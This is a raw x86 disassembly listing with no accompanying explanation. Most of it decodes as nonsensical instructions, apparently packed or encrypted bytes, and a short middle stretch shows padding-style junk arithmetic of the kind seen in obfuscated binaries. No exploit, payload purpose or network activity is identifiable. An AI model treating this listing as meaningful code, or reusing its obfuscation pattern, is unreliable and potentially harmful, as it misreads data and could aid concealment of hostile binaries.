  405a19:	mov    BYTE PTR [ecx+0x25857fc],cl
  405a1f:	push   ecx
  405a20:	and    DWORD PTR [edx+0x4a5329af],0x7e
  405a27:	or     esp,DWORD PTR ds:0x9d719d3e
  405a2d:	inc    eax
  405a2e:	in     al,dx
  405a2f:	mov    ch,0x61
  405a31:	mov    cl,0xf
  405a33:	cmp    bh,bl
  405a35:	jmp    0x405a6b
  405a37:	or     edx,esp
  405a39:	mov    dl,0x10
  405a3b:	sti    
  405a3c:	test   eax,0xa2422c74
  405a41:	pop    es
  405a42:	push   esp
  405a43:	pop    es
  405a44:	lods   al,BYTE PTR ds:[esi]
  405a45:	cwde   
  405a46:	mov    edi,0xdffbe658
  405a4b:	out    0x56,eax
  405a4d:	sbb    BYTE PTR [edi+0xb91ddeb],0xfa
  405a54:	pop    ebx
  405a55:	ss xor al,0x8
  405a58:	test   BYTE PTR [eax-0x72],bl
  405a5b:	icebp  
  405a5c:	pop    ebx
  405a5d:	sbb    bh,al
  405a5f:	mov    eax,ds:0x9223c639
  405a64:	ror    DWORD PTR [edi-0x5f832fb2],cl
  405a6a:	call   0x8f06:0x66ac7077
  405a71:	xchg   ebx,eax
  405a72:	test   al,bh
  405a74:	mov    fs,WORD PTR [edx+0x54]
  405a77:	or     eax,0xc79e7a2f
  405a7c:	ins    BYTE PTR es:[edi],dx
  405a7d:	add    DWORD PTR [ecx],ebx
  405a7f:	sub    BYTE PTR [edx+0x17dabea9],bl
  405a85:	mov    edx,0xf883bc68
  405a8a:	push   ss
  405a8b:	push   es
  405a8c:	cs adc eax,0xbe2b55d5
  405a92:	jecxz  0x405a30
  405a94:	ror    BYTE PTR [ecx+ecx*2],cl
  405a97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a98:	dec    edi
  405a99:	dec    eax
  405a9a:	hlt    
  405a9b:	mov    eax,0x3b073c43
  405aa0:	outs   dx,DWORD PTR ds:[esi]
  405aa1:	sub    dh,BYTE PTR [edx]
  405aa3:	dec    ecx
  405aa4:	scas   eax,DWORD PTR es:[edi]
  405aa5:	(bad)  
  405aa6:	ss mov edx,0x3b40dae7
  405aac:	push   0x42
  405aae:	add    al,0x37
  405ab0:	mov    ecx,0x537efb7e
  405ab5:	xor    eax,0xaea6b09e
  405aba:	inc    ebx
  405abb:	stos   DWORD PTR es:[edi],eax
  405abc:	sub    edx,DWORD PTR [edi]
  405abe:	add    bl,BYTE PTR [eax-0x47]
  405ac1:	xchg   edx,eax
  405ac2:	stos   DWORD PTR es:[edi],eax
  405ac3:	mov    cl,0x86
  405ac5:	push   esi
  405ac6:	push   esp
  405ac7:	ret    
  405ac8:	mov    ecx,DWORD PTR [edi+0x33]
  405acb:	in     al,0xe1
  405acd:	dec    esp
  405ace:	ret    0x359f
  405ad1:	push   ss
  405ad2:	pop    ebx
  405ad3:	xchg   ebp,eax
  405ad4:	sbb    eax,0x80e7eed9
  405ad9:	mov    ss,WORD PTR [ebp-0x2fe6029a]
  405adf:	daa    
  405ae0:	nop
  405ae1:	(bad)
  405ae5:	push   cs
  405ae6:	ss push esp
  405ae8:	mov    esi,0x3f43a8b9
  405aed:	push   esp
  405aee:	pop    esi
  405aef:	push   es
  405af0:	add    ebx,edx
  405af2:	inc    esi
  405af3:	cmp    DWORD PTR [edx+0x1027975b],eax
  405af9:	not    DWORD PTR [edi]
  405afb:	call   0xb7682429
  405b00:	push   ss
  405b01:	out    0x4c,eax
  405b03:	popf   
  405b04:	imul   ebx,DWORD PTR [ebx+0x24ef8810],0x4ec8c070
  405b0e:	ds mov bl,0xaf
  405b11:	es add al,0x67
  405b14:	mov    dl,0xf6
  405b16:	mov    ecx,0x8e16a13
  405b1b:	in     al,dx
  405b1c:	xor    al,0x6d
  405b1e:	popa   
  405b1f:	dec    ecx
  405b20:	or     DWORD PTR [esi],0xce91ded8
  405b26:	ins    BYTE PTR es:[edi],dx
  405b27:	daa    
  405b28:	jg     0x405b6e
  405b2a:	sbb    dh,BYTE PTR [esi+0x2186ec62]
  405b30:	mov    eax,ds:0x6c6eb18b
  405b35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b36:	pop    edx
  405b37:	jmp    0x83c8:0x1152340e
  405b3e:	scas   al,BYTE PTR es:[edi]
  405b3f:	and    al,0xd3
  405b41:	pop    ecx
  405b42:	ins    DWORD PTR es:[edi],dx
  405b43:	or     eax,0xbf437bc0
  405b48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b49:	push   esi
  405b4a:	xlat   BYTE PTR ds:[ebx]
  405b4b:	xor    DWORD PTR fs:[ecx-0x17],ebx
  405b4f:	cmp    BYTE PTR [ebx],0xef
  405b52:	jle    0x405b4d
  405b54:	xchg   ebx,eax
  405b55:	ror    BYTE PTR [eax-0x7c88f9c1],cl
  405b5b:	inc    ebp
  405b5c:	retf   
  405b5d:	sbb    dl,BYTE PTR [edx+0x2f]
  405b60:	stos   BYTE PTR es:[edi],al
  405b61:	push   ecx
  405b62:	idiv   DWORD PTR [ebp-0x45]
  405b65:	popa   
  405b66:	add    dh,BYTE PTR [edx-0x43]
  405b69:	sub    ch,BYTE PTR [ebx+ecx*2-0x45]
  405b6d:	pop    esi
  405b6e:	cmp    al,0xd5
  405b70:	dec    edi
  405b71:	dec    edx
  405b72:	jns    0xaa369e21
  405b78:	fs inc edi
  405b7a:	mov    ds:0xdc9232fa,eax
  405b7f:	enter  0xb57a,0x6c
  405b83:	jne    0x405bb2
  405b85:	fs clc 
  405b87:	xchg   ebx,eax
  405b88:	xchg   BYTE PTR [edi-0x7591e489],cl
  405b8e:	push   ebx
  405b8f:	cmp    esp,DWORD PTR [ebx-0x566caabe]
  405b95:	call   0x3442:0x69ee1d82
  405b9c:	jmp    0xe3672bbd
  405ba1:	ret    
  405ba2:	clc    
  405ba3:	call   DWORD PTR [eax-0x5c9f42e5]
  405ba9:	ins    BYTE PTR es:[edi],dx
  405baa:	xor    al,BYTE PTR ds:0xec926b1a
  405bb0:	push   esi
  405bb1:	adc    ah,bh
  405bb3:	jg     0x405bab
  405bb5:	in     al,dx
  405bb6:	cmp    al,BYTE PTR [ecx-0x1d297fe8]
  405bbc:	cmp    al,0x54
  405bbe:	imul   esp,DWORD PTR [esi],0xffffffae
  405bc1:	add    DWORD PTR [ebp+0x44],0x5ae6b056
  405bc8:	sub    BYTE PTR [ebx-0x76],cl
  405bcb:	not    BYTE PTR [edi-0x75a81769]
  405bd1:	dec    edi
  405bd2:	push   ss
  405bd3:	adc    bl,BYTE PTR [esi-0x11]
  405bd6:	mov    al,ds:0x82d25f67
  405bdb:	xor    bh,dl
  405bdd:	icebp  
  405bde:	fnstsw WORD PTR [eax]
  405be0:	(bad)
  405be3:	js     0x405ba9
  405be5:	push   ds
  405be6:	mov    edi,edx
  405be8:	dec    edx
  405be9:	std    
  405bea:	sbb    ebx,esi
  405bec:	lahf   
  405bed:	imul   ebp,DWORD PTR [eax+0x3e],0xee0506b0
  405bf4:	adc    eax,0x4d00e1e0
  405bf9:	xor    al,0xba
  405bfb:	sub    dl,BYTE PTR [eax]
  405bfd:	jl     0x405c50
  405bff:	jmp    0xfb0:0x3c3dbeea
  405c06:	dec    eax
  405c07:	cmp    al,0x2f
  405c09:	movaps xmm3,XMMWORD PTR [esi-0x64]
  405c0d:	mov    ds,esi
  405c0f:	adc    BYTE PTR [edi],bl
  405c11:	xchg   BYTE PTR [edi],cl
  405c13:	pop    esi
  405c14:	lods   eax,DWORD PTR ds:[esi]
  405c15:	and    dl,dh
  405c17:	iret   
  405c18:	shl    cl,cl
  405c1a:	mov    edx,ebx
  405c1c:	into   
  405c1d:	mov    es,WORD PTR [ebx+0x7764efa5]
  405c23:	jmp    0xdd9e:0x25f085e9
  405c2a:	cs popa 
  405c2c:	pop    ebp
  405c2d:	jmp    0x8724a72
  405c32:	push   esp
  405c33:	lds    ebp,FWORD PTR [edx+0x25fd47c0]
  405c39:	ret    
  405c3a:	xchg   ecx,eax
  405c3b:	sub    BYTE PTR [esi+0x292663df],dl
  405c41:	enter  0x32c4,0x5f
  405c45:	cld    
  405c46:	imul   ecx,DWORD PTR [esi],0xa1777116
  405c4c:	cmp    eax,0x2a94a34c
  405c51:	arpl   WORD PTR [esp+ebx*4-0xc811aa0],si
  405c58:	mov    ecx,0xba4911ba
  405c5d:	cwde   
  405c5e:	push   es
  405c5f:	es test eax,0xf9b61415
  405c65:	hlt    
  405c66:	pop    edi
  405c67:	jns    0x405c08
  405c69:	in     eax,0x13
  405c6b:	sub    eax,0x3a58ad07
  405c70:	fadd   DWORD PTR [ebx]
  405c72:	mov    ah,0xb6
  405c74:	cmp    dh,BYTE PTR ds:0x1946d976
  405c7a:	mov    edx,0xc2b79aff
  405c7f:	mov    dl,0x37
  405c81:	push   esp
  405c82:	ret    0x26d7
  405c85:	leave  
  405c86:	adc    DWORD PTR [edi],ecx
  405c88:	repnz iret 
  405c8a:	xor    al,0x28
  405c8c:	sbb    eax,0x4244a3f
  405c91:	pop    ss
  405c92:	lea    ecx,[ecx-0x31376fc4]
  405c98:	shr    DWORD PTR [ebx+edi*8+0x4b],cl
  405c9c:	out    dx,al
  405c9d:	adc    dh,BYTE PTR [eax]
  405c9f:	sbb    al,0xa0
  405ca1:	outs   dx,DWORD PTR ds:[esi]
  405ca2:	pop    esi
  405ca3:	jns    0x405cb8
  405ca5:	dec    esi
  405ca6:	mov    bl,0x1b
  405ca8:	and    eax,0xdf97307e
  405cad:	mov    edi,0xaa413ade
  405cb2:	pop    es
  405cb3:	inc    eax
  405cb4:	push   ebp
  405cb5:	push   esi
  405cb6:	adc    eax,0xdb1efb31
  405cbb:	mov    edx,0x995b42b1
  405cc0:	ror    esp,1
  405cc2:	jnp    0x405cb2
  405cc4:	data16 mov cl,0x30
  405cc7:	xor    eax,0x147bafa3
  405ccc:	loop   0x405d12
  405cce:	lahf   
  405ccf:	mov    al,ds:0xbac78dde
  405cd4:	adc    eax,0x174e3884
  405cd9:	pop    edx
  405cda:	leave  
  405cdb:	adc    al,0xfe
  405cdd:	xchg   edx,eax
  405cde:	jbe    0x405cb2
  405ce0:	lahf   
  405ce1:	mov    eax,0xdb276910
  405ce6:	adc    ecx,DWORD PTR [ebp-0xc327eae]
  405cec:	mov    ebx,0xf7306b2c
  405cf1:	aas    
  405cf2:	pop    eax
  405cf3:	test   al,0xad
  405cf5:	adc    DWORD PTR [ebx],esp
  405cf7:	cli    
  405cf8:	add    dh,ah
  405cfa:	xor    al,0xdc
  405cfc:	xor    BYTE PTR [eax-0x6e],al
  405cff:	push   ebp
  405d00:	push   edx
  405d01:	pusha  
  405d02:	stos   DWORD PTR es:[edi],eax
  405d03:	push   ebp
  405d04:	(bad)  
  405d05:	jmp    0xe9319dfb
  405d0a:	jb     0x405d3f
  405d0c:	mov    dl,0x2e
  405d0e:	adc    eax,DWORD PTR [eax-0x73a9fa4c]
  405d14:	aaa    
  405d15:	xchg   edi,eax
  405d16:	jg     0x405c9e
  405d18:	xor    eax,0xb781f949
  405d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d1e:	jb     0x405d9a
  405d20:	ret    
  405d21:	pop    ebx
  405d22:	xchg   ebx,eax
  405d23:	push   ds
  405d24:	dec    ecx
  405d25:	jg     0x405cbe
  405d27:	inc    ebx
  405d28:	into   
  405d29:	daa    
  405d2a:	call   0xf25458cd
  405d2f:	cmp    ah,BYTE PTR [ebx-0xe38060f]
  405d35:	xor    eax,0x530abf96
  405d3a:	fmul   DWORD PTR [eax-0x7764b410]
  405d40:	mov    ch,0xcf
  405d42:	mov    edi,0x4878fc73
  405d47:	fldcw  WORD PTR [edi]
  405d49:	mov    bl,0x8
  405d4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d4c:	xchg   edx,eax
  405d4d:	in     eax,0xb2
  405d4f:	fisubr WORD PTR [ebx]
  405d51:	jo     0x405d8a
  405d53:	push   ebp
  405d54:	mov    edx,DWORD PTR [ebx+0x4]
  405d57:	movzx  edx,BYTE PTR ds:0x422946
  405d5e:	sub    DWORD PTR ds:0x4228f2,edx
  405d64:	xor    DWORD PTR [ebp-0x1c],edi
  405d67:	mov    edx,eax
  405d69:	or     DWORD PTR ds:0x4229ae,0x4229a2
  405d73:	xor    eax,eax
  405d75:	or     DWORD PTR ds:0x4228fa,0x422996
  405d7f:	or     eax,DWORD PTR [ebp-0x1c]
  405d82:	shl    edx,0x1e
  405d85:	sub    DWORD PTR ds:0x4228be,0x422982
  405d8f:	imul   eax,ecx
  405d92:	mov    ecx,DWORD PTR [ebx]
  405d94:	mov    edx,DWORD PTR [ebx+0x4]
  405d97:	shrd   ecx,edx,0x2
  405d9b:	inc    DWORD PTR ds:0x4228ee
  405da1:	mov    DWORD PTR [ebp-0x1c],ecx
  405da4:	mov    ecx,DWORD PTR [ebx]
  405da6:	xor    DWORD PTR [ebp-0x1c],edi
  405da9:	shr    edx,0x2
  405dac:	and    edx,DWORD PTR ds:0x4228ba
  405db2:	mov    edx,DWORD PTR [ebx+0x4]
  405db5:	movzx  edx,BYTE PTR ds:0x4228d2
  405dbc:	or     edx,DWORD PTR ds:0x422916
  405dc2:	mov    DWORD PTR ds:0x4228d2,edx
  405dc8:	mov    edx,ecx
  405dca:	add    DWORD PTR ds:0x42292a,0x4228d2
  405dd4:	xor    ecx,ecx
  405dd6:	and    DWORD PTR ds:0x4228c6,0x42295e
  405de0:	or     ecx,DWORD PTR [ebp-0x1c]
  405de3:	sbb    DWORD PTR ds:0x42288e,0x3b2c
  405ded:	shl    edx,0x1e
  405df0:	add    DWORD PTR ds:0x422926,0x2b51
  405dfa:	sub    ecx,eax
  405dfc:	mov    DWORD PTR ds:0x422992,0x2b61
  405e06:	mov    eax,DWORD PTR [ebp-0xc]
  405e09:	cmp    DWORD PTR [eax],ecx
  405e0b:	mov    eax,0x22e3
  405e10:	mov    eax,DWORD PTR [ebp-0xc]
  405e13:	jg     0x4069f3
  405e19:	xor    DWORD PTR ds:0x422956,0x2c62
  405e23:	mov    ecx,DWORD PTR [ebp+0x18]
  405e26:	adc    edx,0x3fdb
  405e2c:	mov    edx,DWORD PTR [ebp+0x1c]
  405e2f:	shrd   ecx,edx,0x2
  405e33:	or     DWORD PTR ds:0x42290e,0x2fd2
  405e3d:	mov    DWORD PTR [ebp-0x1c],ecx
  405e40:	xor    DWORD PTR ds:0x42297e,0x77ef
  405e4a:	mov    ecx,DWORD PTR [ebp+0x18]
  405e4d:	xor    DWORD PTR [ebp-0x1c],edi
  405e50:	shl    ecx,0x1e
  405e53:	xor    ecx,ecx
  405e55:	add    DWORD PTR ds:0x4229c6,0x4228de
  405e5f:	or     ecx,DWORD PTR [ebp-0x1c]
  405e62:	xor    DWORD PTR ds:0x42295a,0x42288a
  405e6c:	shr    edx,0x2
  405e6f:	mov    edx,DWORD PTR [ebp+0x1c]
  405e72:	mov    DWORD PTR [ebp-0x2c],ecx
  405e75:	mov    ecx,DWORD PTR [ebx]
  405e77:	or     DWORD PTR ds:0x42290a,edi
  405e7d:	mov    edx,DWORD PTR [ebx+0x4]
  405e80:	shrd   ecx,edx,0x2
  405e84:	sub    DWORD PTR ds:0x42294a,0x1cb2
  405e8e:	jmp    0x406418
  405e93:	fwait
  405e94:	push   edx
  405e95:	dec    esi
  405e96:	mov    dl,0x4e
  405e98:	xchg   edx,eax
  405e99:	sbb    edx,DWORD PTR [edx+0x58]
  405e9c:	inc    edi
  405e9d:	push   esi
  405e9e:	je     0x405ed0
  405ea0:	(bad)  
  405ea1:	dec    esi
  405ea2:	test   al,0x3e
  405ea4:	xchg   edi,eax
  405ea5:	push   ss
  405ea6:	push   ss
  405ea7:	cmp    eax,0x71161604
  405eac:	cmc    
  405ead:	sub    DWORD PTR [edi],ebx
  405eaf:	aam    0x83
  405eb1:	cld    
  405eb2:	pop    esp
  405eb3:	dec    ecx
  405eb4:	and    DWORD PTR [esp],ebp
  405eb7:	mov    esi,0xdb0eb608
  405ebc:	pop    esp
  405ebd:	gs jno 0x405f16
  405ec0:	mov    BYTE PTR [ebp+esi*2-0x5c4e0f2f],ch
  405ec7:	test   DWORD PTR [ecx+ecx*1+0x13],ebx
  405ecb:	pop    esi
  405ecc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ecd:	xchg   BYTE PTR [edi+esi*1-0x71],cl
  405ed1:	aad    0x6a
  405ed3:	pop    ecx
  405ed4:	sbb    dl,BYTE PTR [ebp+0x349a0996]
  405eda:	add    eax,0xf99f8b9f
  405edf:	and    cl,cl
  405ee1:	mov    gs,WORD PTR [edi+0x12]
  405ee4:	inc    ebp
  405ee5:	mov    edx,0xc903037
  405eea:	imul   ebx,DWORD PTR [ebp-0x5],0xfb4fd95c
  405ef1:	xor    cl,al
  405ef3:	popf   
  405ef4:	dec    ebx
  405ef5:	adc    ebx,DWORD PTR [edx+ebp*4-0x6a152025]
  405efc:	cmp    BYTE PTR fs:[edi],dl
  405eff:	int    0xbc
  405f01:	jl     0x405ef4
  405f03:	pop    ss
  405f04:	aad    0xd4
  405f06:	fld    TBYTE PTR [edi]
  405f08:	sub    al,0xdd
  405f0a:	mov    cl,0xfd
  405f0c:	push   eax
  405f0d:	jo     0x405f6a
  405f0f:	loope  0x405f77
  405f11:	jnp    0x405e97
  405f13:	inc    eax
  405f14:	retf   0xe525
  405f17:	fisub  DWORD PTR [esi+0x3f0bf52c]
  405f1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f1e:	in     eax,0x57
  405f20:	mov    al,0xd7
  405f22:	mov    eax,ds:0xcfe086a5
  405f27:	mov    BYTE PTR [ecx+0x6a70ee93],dh
  405f2d:	inc    ecx
  405f2e:	leave  
  405f2f:	dec    edi
  405f30:	adc    al,0xd0
  405f32:	inc    ebp
  405f33:	add    esi,DWORD PTR [edx+0x1d]
  405f36:	jnp    0x405f09
  405f38:	sub    dl,BYTE PTR [esi]
  405f3a:	sbb    DWORD PTR [ebp+eiz*2+0x6c],ebx
  405f3e:	stos   BYTE PTR es:[edi],al
  405f3f:	pushf  
  405f40:	gs cdq 
  405f42:	hlt    
  405f43:	(bad)  
  405f44:	mov    edi,DWORD PTR [esi+edi*2+0x24ce2570]
  405f4b:	call   0x2ea45fa6
  405f50:	mov    esp,0x78408992
  405f55:	jno    0x405fd4
  405f57:	mov    ds:0x9637f1da,al
  405f5c:	jp     0x405f63
  405f5e:	sbb    ebp,edi
  405f60:	push   ebx
  405f61:	add    esp,DWORD PTR [edi+eiz*1]
  405f64:	int3   
  405f65:	jno    0x405fde
  405f67:	jmp    0xca07:0x477b5644
  405f6e:	sbb    edx,DWORD PTR [esi-0x325d6c27]
  405f74:	mov    al,ds:0x74d913ca
  405f79:	xor    DWORD PTR ds:0x65977c75,0x2deebdf9
  405f83:	mov    DWORD PTR [ecx+0x58d152e8],eax
  405f89:	clc    
  405f8a:	push   edx
  405f8c:	xor    al,0x52
  405f8e:	jp     0x405fb3
  405f90:	hlt    
  405f91:	call   0xf30:0x5f95ac94
  405f98:	mov    bh,0x4a
  405f9a:	pop    ebx
  405f9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f9c:	repnz mov bl,0xa6
  405f9f:	daa    
  405fa0:	fnsave [ecx]
  405fa2:	adc    al,0x49
  405fa4:	retf   0x6b8b
  405fa7:	mov    ebp,0x3018e23e
  405fac:	hlt    
  405fad:	inc    ebx
  405fae:	icebp  
  405faf:	fs fs lock add al,0x59
  405fb4:	in     eax,0xd2
  405fb6:	mov    cs,WORD PTR [edi]
  405fb8:	xlat   BYTE PTR ds:[ebx]
  405fb9:	cmc    
  405fba:	ins    DWORD PTR es:[edi],dx
  405fbb:	in     al,0xdb
  405fbd:	add    bl,bh
  405fbf:	iret   
  405fc0:	mov    bh,0x65
  405fc2:	sar    BYTE PTR [ebx+0x2ec34b3a],1
  405fc8:	aas    
  405fc9:	cmp    ebx,esp
  405fcb:	xor    edx,DWORD PTR ds:0x5ed4d08d
  405fd1:	fstp   DWORD PTR [ebp-0xa]
  405fd4:	nop
  405fd5:	cli    
  405fd6:	jb     0x40603e
  405fd8:	ror    DWORD PTR [edi+0x26],1
  405fdb:	and    ch,ch
  405fdd:	sub    edi,ebx
  405fdf:	jecxz  0x405fca
  405fe1:	xchg   dh,bl
  405fe3:	jbe    0x405f6f
  405fe5:	jl     0x405fec
  405fe7:	out    0x92,eax
  405fe9:	and    eax,DWORD PTR [edx+ebp*8]
  405fec:	repnz dec ebp
  405fee:	mov    ebp,DWORD PTR [eax+0x512d7ec6]
  405ff4:	adc    DWORD PTR [ecx-0x17],ebx
  405ff7:	lods   al,BYTE PTR ds:[esi]
  405ff8:	pusha  
  405ff9:	dec    BYTE PTR [eax]
  405ffb:	mov    esp,0xc69abd76
  406000:	jne    0x406078
  406002:	dec    ebx
  406003:	mov    ch,bh
  406005:	and    al,0x1a
  406007:	xchg   edx,eax
  406008:	xchg   edx,eax
  406009:	fst    QWORD PTR [ecx]
  40600b:	cmp    al,0x3a
  40600d:	not    DWORD PTR [edi-0x74]
  406010:	or     ah,al
  406012:	int    0x5
  406014:	aad    0xd5
  406016:	mov    ?,esp
  406018:	and    al,0xfb
  40601a:	imul   esi,esi,0xffffffb3
  40601d:	leave  
  40601e:	jl     0x406087
  406020:	call   0xca9:0x4875d02b
  406027:	lods   al,BYTE PTR ds:[esi]
  406028:	xchg   edi,eax
  406029:	pop    esi
  40602a:	pop    ecx
  40602b:	jp     0x405fb1
  40602d:	adc    ah,cl
  40602f:	test   al,0x27
  406031:	ficomp DWORD PTR [eax+0xb79a012]
  406037:	sbb    eax,0x5f945dde
  40603c:	leave  
  40603d:	cmp    ah,BYTE PTR [edi-0x4c]
  406040:	inc    esp
  406041:	into   
  406042:	(bad)  
  406044:	fisttp WORD PTR ds:0x54ca6250
  40604a:	int3   
  40604b:	div    BYTE PTR [edi-0x10]
  40604e:	push   esi
  40604f:	and    al,ah
  406051:	inc    edi
  406052:	lods   eax,DWORD PTR ds:[esi]
  406053:	mov    bl,0xc7
  406055:	xor    ecx,DWORD PTR [ecx-0x7b49e5c]
  40605b:	mov    ds:0xe55bff4d,eax
  406060:	fs inc edi
  406062:	inc    DWORD PTR [eax+0x4cb5c1ea]
  406068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406069:	fadd   DWORD PTR [ebx]
  40606b:	mov    bh,0x76
  40606d:	mov    WORD PTR [ebp+0x597b1fdb],cs
  406073:	dec    ebx
  406074:	dec    edi
  406075:	and    eax,0xd09ae281
  40607a:	fucom  st(6)
  40607c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40607d:	mov    ah,0x27
  40607f:	retf   
  406080:	pushf  
  406081:	mov    ecx,0xc63bd140
  406086:	push   ebx
  406088:	or     ebx,esp
  40608a:	pushf  
  40608b:	loopne 0x406043
  40608d:	mov    eax,ds:0x350a33f0
  406092:	repz fwait
  406094:	je     0x406096
  406096:	adc    BYTE PTR [eax+ecx*8-0x49],dl
  40609a:	cmp    BYTE PTR [ebp-0x191f91e4],cl
  4060a0:	sub    BYTE PTR [esi-0x21],al
  4060a3:	sti    
  4060a4:	(bad)  
  4060a5:	addr16 xchg esi,eax
  4060a7:	bound  ebx,QWORD PTR [edx+0x37b836e2]
  4060ad:	mov    dl,0xbd
  4060af:	push   eax
  4060b0:	sub    BYTE PTR [eax+0x74],cl
  4060b3:	or     edi,DWORD PTR [esi-0x461c8c8c]
  4060b9:	loop   0x40611c
  4060bb:	mov    bl,0x94
  4060bd:	push   esp
  4060be:	xor    eax,0xe8f388e9
  4060c3:	not    BYTE PTR [edx]
  4060c5:	ja     0x4060ab
  4060c7:	add    eax,0xf32f708e
  4060cc:	push   ebp
  4060cd:	inc    edx
  4060ce:	(bad)
  4060d1:	mov    WORD PTR [edi+ebx*4+0x43],?
  4060d5:	jp     0x40605c
  4060d7:	pop    ebx
  4060d8:	hlt    
  4060d9:	xchg   BYTE PTR [ecx+0x3e9bc9cb],ah
  4060df:	mov    bh,0x1
  4060e1:	aad    0x70
  4060e3:	mov    dl,0x37
  4060e5:	cmp    DWORD PTR [ecx+0x52],ebx
  4060e8:	jmp    0x69c8:0x13e858d3
  4060ef:	mov    ebx,0xa9f5974b
  4060f4:	cdq    
  4060f5:	sbb    ch,BYTE PTR [esi+0x39]
  4060f8:	xchg   ebp,eax
  4060f9:	fwait
  4060fa:	fwait
  4060fb:	xchg   esp,eax
  4060fc:	(bad)  
  4060fe:	sub    BYTE PTR [esi-0x4d988d44],al
  406104:	test   BYTE PTR [ebx],bl
  406106:	xchg   ecx,eax
  406107:	cld    
  406108:	push   ecx
  406109:	inc    eax
  40610a:	test   DWORD PTR [edx-0x16604cf3],ebx
  406110:	shl    BYTE PTR [ebp+ebp*1+0x4f417441],0x57
  406118:	rcr    BYTE PTR [edi+ebx*8+0x46],0x38
  40611d:	dec    esp
  40611e:	or     al,0x50
  406120:	xlat   BYTE PTR cs:[ebx]
  406122:	mov    cl,0xfd
  406124:	jbe    0x4060d9
  406126:	inc    ebp
  406127:	push   es
  406128:	mov    ah,0x6f
  40612a:	fwait
  40612b:	inc    esi
  40612c:	lods   al,BYTE PTR ds:[esi]
  40612d:	and    dh,dl
  40612f:	sbb    ebp,DWORD PTR [ebp+0x12]
  406132:	mov    ebp,fs
  406134:	sbb    ebx,DWORD PTR [ecx+0x50]
  406137:	sub    BYTE PTR [ecx+0x1d],cl
  40613a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40613b:	push   ds
  40613c:	adc    ebp,edi
  40613e:	(bad)  
  40613f:	nop
  406140:	cmp    ch,BYTE PTR ds:0x72f5d376
  406146:	and    BYTE PTR [eax+0x440ff5d5],0x98
  40614d:	cdq    
  40614e:	mov    al,0x6e
  406150:	cmp    ebx,DWORD PTR [ecx]
  406152:	fimul  DWORD PTR [ebx-0x15]
  406155:	fnsave [esi+0x61]
  406158:	or     DWORD PTR [ebx+0x78],esp
  40615b:	dec    esi
  40615c:	sub    eax,0x41377e62
  406161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406162:	ret    0xb55
  406165:	mov    ecx,0x4113072e
  40616a:	mov    ebp,0x455e0a1
  40616f:	aam    0x65
  406171:	xchg   edi,eax
  406172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406173:	mov    ds:0x3a32afd3,al
  406178:	shl    DWORD PTR [edi-0x18],0x2a
  40617c:	mov    eax,0x9b6e1a00
  406181:	sub    BYTE PTR [ebp-0x6e],0x47
  406185:	jns    0x4061f6
  406187:	cmp    ah,dl
  406189:	out    0x7d,al
  40618b:	or     esp,eax
  40618d:	add    al,0xd7
  40618f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406190:	dec    DWORD PTR [ebx+esi*4+0x37]
  406194:	cmp    eax,0xecad112c
  406199:	mov    bl,0x59
  40619b:	icebp  
  40619c:	mov    esi,0x54ae3c34
  4061a1:	lods   eax,DWORD PTR ds:[esi]
  4061a2:	pop    es
  4061a3:	cli    
  4061a4:	push   es
  4061a5:	mov    ebx,0xb78f538c
  4061aa:	jge    0x406211
  4061ac:	xor    esi,DWORD PTR [ebp-0x7f28bab]
  4061b2:	addr16 mov ecx,0x4691ea71
  4061b8:	sbb    BYTE PTR [esi],dh
  4061ba:	dec    eax
  4061bb:	push   es
  4061bc:	cmp    BYTE PTR [edi],ah
  4061be:	cmp    BYTE PTR ds:0xc1ab3eb7,0xe0
  4061c5:	inc    ebp
  4061c6:	pop    eax
  4061c7:	and    eax,0xef602262
  4061cc:	xor    edi,ebx
  4061ce:	retf   
  4061cf:	or     al,BYTE PTR [ebx+0x1e]
  4061d2:	cmp    al,0x8e
  4061d4:	inc    ecx
  4061d5:	js     0x40620a
  4061d7:	jp     0x40621a
  4061d9:	mov    esp,0x71151ecb
  4061de:	call   0x7ee:0xba2a0a7f
  4061e5:	cwde   
  4061e6:	adc    al,0x9e
  4061e8:	mov    edx,0x504ae6a9
  4061ed:	test   BYTE PTR [esi+0x3d],cl
  4061f0:	fcmovnbe st,st(2)
  4061f2:	je     0x406265
  4061f4:	xor    BYTE PTR [eax+0x6fa07df6],0xa7
  4061fb:	mov    eax,0xe96c253a
  406200:	shl    DWORD PTR [edx-0x16046f42],cl
  406206:	test   BYTE PTR [ebp+0x5ac5e68f],bh
  40620c:	push   ebp
  40620d:	inc    ecx
  40620e:	outs   dx,BYTE PTR ds:[esi]
  40620f:	(bad)  
  406210:	mov    ecx,0x7cb63fc9
  406215:	fld    TBYTE PTR [edi+0x40]
  406218:	dec    eax
  406219:	xor    DWORD PTR [eax],eax
  40621b:	and    eax,0xb5d540a8
  406220:	test   DWORD PTR [ecx+0xd],edi
  406223:	aad    0x1c
  406225:	jbe    0x406243
  406227:	loop   0x406252
  406229:	and    bl,BYTE PTR [ebp-0x80]
  40622c:	sub    dl,BYTE PTR [esp+ecx*4-0x47]
  406230:	mov    ah,0x19
  406232:	mov    DWORD PTR [ebp+0x3d0ce51f],eax
  406238:	retf   0xc023
  40623b:	fs mov esi,0x9a241f83
  406241:	repz into 
  406243:	retf   0x101f
  406246:	sti    
  406247:	xor    edx,DWORD PTR [esi-0x184b6149]
  40624d:	loopne 0x4061d4
  40624f:	xor    dl,BYTE PTR [esi+0x79]
  406252:	dec    esi
  406253:	je     0x406247
  406255:	xor    al,0xb1
  406257:	in     eax,dx
  406258:	push   ss
  406259:	test   eax,0x2dd0eab1
  40625e:	ds xchg edi,eax
  406260:	jnp    0x4062b1
  406262:	pop    ebx
  406263:	mov    esp,0x94e34f69
  406268:	sbb    esp,esp
  40626a:	xchg   ebp,eax
  40626b:	out    0x5a,eax
